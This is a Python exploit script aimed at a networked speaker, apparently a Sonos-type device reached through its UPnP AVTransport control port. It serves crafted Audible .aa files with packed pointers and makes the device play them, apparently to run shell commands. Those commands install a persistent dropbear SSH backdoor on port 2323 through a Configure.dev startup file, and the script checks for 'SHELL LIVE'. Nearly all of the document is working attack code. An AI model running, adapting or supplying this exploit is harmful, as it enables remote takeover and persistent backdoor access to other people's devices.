#!/usr/bin/env python3
import struct, subprocess, time, urllib.request, sys, os, http.server, socketserver, threading
IP="192.168.4.135"; HOST="192.168.4.160"; PORT=8985
SVC="urn:schemas-upnp-org:service:AVTransport:1"; CTL=f"http://{IP}:1400/MediaRenderer/AVTransport/Control"
PROTO="http-get:*:audio/aac:*"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        p=f"recon/tnzm_audible/sweep2/{self.path.split('?')[0].lstrip('/')}"
        data=open(p,"rb").read() if os.path.exists(p) else b"x"
        self.send_response(200); self.send_header("Content-Length",str(len(data))); self.end_headers(); self.wfile.write(data)
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
threading.Thread(target=lambda: socketserver.TCPServer((HOST,PORT),H).serve_forever(),daemon=True).start()
def soap(action,extra=""):
    body=('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
          f'<u:{action} xmlns:u="{SVC}"><InstanceID>0</InstanceID>{extra}</u:{action}></s:Body></s:Envelope>')
    r=subprocess.run(["curl","-s","-m","15","-X","POST","-H",'Content-Type: text/xml; charset="utf-8"',"-H",f'SOAPACTION: "{SVC}#{action}"',"--data-binary",body,CTL],capture_output=True,text=True)
    import re
    m=re.search(r"errorCode>(\d+)<",r.stdout)
    return f"ERR{m.group(1)}" if m else "200"
def didl(url):
    return ('&lt;DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/"&gt;&lt;item id="-1" parentID="-1" restricted="true"&gt;&lt;dc:title&gt;t&lt;/dc:title&gt;&lt;upnp:class&gt;object.item.audioItem.musicTrack&lt;/upnp:class&gt;&lt;res protocolInfo="'+PROTO+'"&gt;'+url+'&lt;/res&gt;&lt;/item&gt;&lt;/DIDL-Lite&gt;')
def setav(path):
    url=f"http://{HOST}:{PORT}/{path}"
    return soap("SetAVTransportURI",f"<CurrentURI>{url}</CurrentURI><CurrentURIMetaData>{didl(url)}</CurrentURIMetaData>")
def alive(t=1.5):
    try: return urllib.request.urlopen(f"http://{IP}:1400/status/VERSION",timeout=t).status==200
    except Exception: return False
def port(p):
    r=subprocess.run(["nc","-z","-G","3",IP,str(p)],capture_output=True,text=True)
    return r.returncode==0
base=open("recon/tnzm_audible/sweep2/CAN135_00710000.aa","rb").read()
def rebuild(S,fn,cmd):
    b=bytearray(24000); d=lambda off: S+6380+off
    b[0:len(cmd)]=cmd; b[len(cmd)]=0
    struct.pack_into(">I",b,108,d(200)); struct.pack_into(">I",b,200,d(600))
    struct.pack_into(">I",b,628,fn); struct.pack_into(">I",b,6404,d(100))
    struct.pack_into(">I",b,23620,d(0))
    return bytes(base[:36])+bytes(b)
S=0x704000
STEPS=[
 ("P1_mkdir", b"mkdir -p /jffs/system\x00"),
 ("P5_keygen", b"/bin/dropbearkey -t ecdsa -f /jffs/k -s 256\x00"),
 ("P2_l1", b"printf '#!/bin/sh\\n'>/jffs/system/C\x00"),
 ("P3_l2", b"printf '/usr/bin/dropbear -r /jffs/k -p 2323\\n'>>/jffs/system/C\x00"),
 ("P4_mv", b"mv /jffs/system/C /jffs/system/Configure.dev\x00"),
]
for n,cmd in STEPS:
    assert len(cmd)<=107, (n,len(cmd))
    fn=f"SEQ_{n}_{S:06x}.aa"
    open(f"recon/tnzm_audible/sweep2/{fn}","wb").write(rebuild(S,0x4ab64c,cmd))
    if not alive():
        for _ in range(60):
            time.sleep(3)
            if alive(): break
    c1=setav("A_toc_past_eof.aa"); soap("Play","<Speed>1</Speed>"); time.sleep(2.0)
    c2=setav(fn); soap("Play","<Speed>1</Speed>")
    print(f"{n}: fired ({len(cmd)}B, s1={c1} s2={c2}); waiting out the reboot cycle",flush=True)
    time.sleep(120)   # watchdog reboot ~60-100s + recovery
    if port(2323):
        print(f"*** 2323 OPEN after {n} — SHELL LIVE",flush=True); break
print("sequence done",flush=True)
